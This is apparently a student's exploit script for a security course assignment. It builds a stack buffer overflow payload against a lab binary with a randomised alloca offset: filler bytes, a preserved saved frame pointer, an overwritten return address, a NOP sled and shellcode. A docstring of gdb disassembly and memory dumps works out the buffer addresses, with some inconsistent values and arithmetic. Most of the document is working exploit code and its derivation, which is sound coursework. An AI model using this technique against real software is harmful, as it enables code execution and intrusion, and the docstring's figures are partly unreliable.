#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Overflow buffer
sys.stdout.buffer.write(b"\x69" * 1024)

# Don't change ebp
sys.stdout.buffer.write(pack("<I", 0xfffe9650))

# Overwrite return address:
#  Choose any address higher than where alloca starts
sys.stdout.buffer.write(pack("<I", 0xfffe9658))
# sys.stdout.buffer.write(pack("<I", 0x08048971))  # Old return address

# Overwrite everything in the stack with NOPs and shellcode at the end
sys.stdout.buffer.write(b"\x90" * 4096)
sys.stdout.buffer.write(shellcode)

"""
This method should work in theory, but just overwrite everything with NOPs.

1. First understand what is happening in _main:

(gdb) disas _main
Dump of assembler code for function _main:

  # Function prologue
  0x080488c3 <+0>:     push   %ebp
  0x080488c4 <+1>:     mov    %esp,%ebp

  # Make room for local variables f and r
  0x080488c6 <+3>:     sub    $0x8,%esp

  # This will always be true
  0x080488c9 <+6>:     cmpl   $0x2,0x8(%ebp)
    
    ...

  # Push address to "/dev/urandom" onto the stack (below reserved space for f and r); first arg of fopen.
  0x080488f0 <+45>:    push   $0x80abdad

  # Push address to "rb" onto stack (below reserved space for f and r); second arg of fopen
  0x080488f5 <+50>:    push   $0x80abdb0

  # Call fopen with 2 args on top of stack
  0x080488fa <+55>:    call   0x8050210 <fopen>

  # Remove the two args on top of the stack (below reserved space for f and r)
  0x080488ff <+60>:    add    $0x8,%esp

  # This instruction effectively assigns this pointer to the local variable f.
  # The eax reg holds the return value from fopen. This moves the value in eax 
  # reg into the memory location that is 4 bytes before the base pointer (ebp).
  0x08048902 <+63>:    mov    %eax,-0x4(%ebp)

  # In our case, file pointer wil never be a null pointer, so always jump.
  0x08048905 <+66>:    cmpl   $0x0,-0x4(%ebp)
  0x08048909 <+70>:    jne    0x8048921 <_main+94>
    ...
  
  # Push file pointer onto stack; 4th arg of fread
  0x08048921 <+94>:    pushl  -0x4(%ebp)

  # Push 1 onto stack; 3rd arg of fread
  0x08048924 <+97>:    push   $0x1

  # Push sizeof(r), which is the size of an unsigned int which is 4 bytes
  0x08048926 <+99>:    push   $0x4

  # Loads the effective address of r into eax reg and pushes that address on the stack
  0x08048928 <+101>:   lea    -0x8(%ebp),%eax
  0x0804892b <+104>:   push   %eax

  # Call fread and then remove f, 1, sizeof(r), and &r from stack
  0x0804892c <+105>:   call   0x8050230 <fread>
  0x08048931 <+110>:   add    $0x10,%esp
  
  # The rest doesn't matter, since we know:
  #  - file pointer is at -0x4(%ebp)
  #  - r is at -0x8(%ebp)

  # Push address of file pointer on stack, call close, then remove the address of file pointer
  0x08048934 <+113>:   pushl  -0x4(%ebp)
  0x08048937 <+116>:   call   0x804fd60 <fclose>
  0x0804893c <+121>:   add    $0x4,%esp

  # The rest doesn't matter, since we know:
  #  - file pointer is at -0x4(%ebp)
  #  - r is at -0x8(%ebp)
  0x0804893f <+124>:   mov    -0x8(%ebp),%eax

  0x08048942 <+127>:   movzbl %al,%eax
  0x08048945 <+130>:   lea    0xf(%eax),%edx
  0x08048948 <+133>:   mov    $0x4,%eax
  0x0804894d <+138>:   sub    $0x1,%eax
  0x08048950 <+141>:   add    %edx,%eax
  0x08048952 <+143>:   mov    $0x4,%ecx
  0x08048957 <+148>:   mov    $0x0,%edx
  0x0804895c <+153>:   div    %ecx
  0x0804895e <+155>:   imul   $0x4,%eax,%eax
  0x08048961 <+158>:   sub    %eax,%esp
  0x08048963 <+160>:   mov    0xc(%ebp),%eax
  0x08048966 <+163>:   add    $0x4,%eax
  0x08048969 <+166>:   mov    (%eax),%eax
  0x0804896b <+168>:   push   %eax
  0x0804896c <+169>:   call   0x80488a5 <vulnerable>
  0x08048971 <+174>:   add    $0x4,%esp
  0x08048974 <+177>:   mov    $0x0,%eax
  0x08048979 <+182>:   leave  
  0x0804897a <+183>:   ret    
End of assembler dump.

2. Find the value of r
gdb --args ./1.2.7 $(python3 1.2.7.py)
(gdb) b _main
(gdb) r
(gdb) x /2wx $ebp
0xfffe9650:     0xffffcdc8      0x08048a12
(gdb) b vulnerable
(gdb) cont
(gdb) x /72bx 0xFFFE9610
0xfffe9610:     0x00    0x90    0x0d    0x08    0x00    0x90    0x0d    0x08
0xfffe9618:     0xa8    0x81    0x04    0x08    0x22    0x02    0x05    0x08
0xfffe9620:     0x00    0x00    0x00    0x00    0x00    0x90    0x0d    0x08
0xfffe9628:     0x00    0x90    0x0d    0x08    0x6b    0xfd    0x04    0x08
0xfffe9630:     0x00    0x90    0x0d    0x08    0x00    0x90    0x0d    0x08
0xfffe9638:     0xa8    0x81    0x04    0x08    0x50    0x96    0xfe    0xff
0xfffe9640:     0x3c    0x89    0x04    0x08    0xf0    0xd2    0x0d    0x08
0xfffe9648:     "0xe6    0x80    0xad    0x88"    0xf0    0xd2    0x0d    0x08
0xfffe9650:     0xc8    0xcd    0xff    0xff    0x12    0x8a    0x04    0x08

Obeserve the values:
  - File Pointer (doesn't change): 0xf0    0xd2    0x0d    0x08
  - Old EBP (doesn't change): 0xc8    0xcd    0xff    0xff    
  - Old Return Address (doesn't change, but will be hacked): 0x12    0x8a    0x04    0x08

The pseudo randomly generated number this time is 0x88ad806e

3. Find the vulnerable's ebp (this will change per run with r):

(gdb) x /2wx $ebp
0xfffe9544:     0xfffe9650      0x08048971

4. Calculate the vulnerable's ebp's offset:

The offset is calculated by r & 0xFF or 0x88ad806e & 0xFF.

To calculate 0x88ad80e6 & 0xFF, take the last two hexadecimal digits of 0x88ad80e6, which are e6, and convert them to decimal.

In decimal, 0xe6 is 230, so 0x88ad806e & 0xFF == 230.

5. Calculate vulnerable's MIN edp and vulnerable's MAX edp:

VULN_EBP_WITH_MIN_OFFSET: 0xfffe9544 + 0xe6 == 0xFFFE962A
VULN_EBP_WITH_MAX_OFFSET: 0xFFFE962A - 0x110 == 0xFFFE951A

6. Find out where the buffer will start:

To calculate the start subtract 1024 bytes from the ebp. For example, the start with this randomized ebp is 0xfffe9544 - 0x400 = 0xFFFE9144. Can verfiy with:

(gdb) b *0x08048971
(gdb) x /1032bx 0xFFFE9144

Calculate the range:

MAX_VULN_BUFF_START = VULN_EBP_WITH_MIN_OFFSET - 0x400 = 0xFFFE962A - 0x400 = 0xFFFE922A
MIN_VULN_BUFF_START = VULN_EBP_WITH_MAX_OFFSET - 0x400 = 0xFFFE951A - 0x400 = 0xFFFE911A
"""